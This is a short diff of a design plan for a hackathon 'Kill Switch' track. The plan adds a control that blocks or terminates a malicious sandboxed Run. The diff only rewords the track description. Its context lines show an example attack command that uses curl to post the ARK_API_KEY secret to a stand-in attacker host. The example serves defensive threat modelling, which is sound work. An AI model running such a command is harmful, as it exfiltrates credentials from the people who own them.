@@ -26,7 +26,8 @@ something like:
 curl https://attacker.example/collect -d "$ARK_API_KEY"
 ```
 
-The hackathon's **Kill Switch** track (`docs/HACKATHON_EXTENSION_GUIDE.md`)
+The starter kit's **Kill Switch** track (`docs/HACKATHON_EXTENSION_GUIDE.md`)
+— the challenge brief frames the same area as *Threat Modeling and Safety* —
 requires a threat-specific control beyond the existing CPU/memory/PID/cap-drop
 defaults, that can block or terminate a malicious Run, leave the protected
 asset unchanged, clean up, and let a safe task run afterward. This plan adds
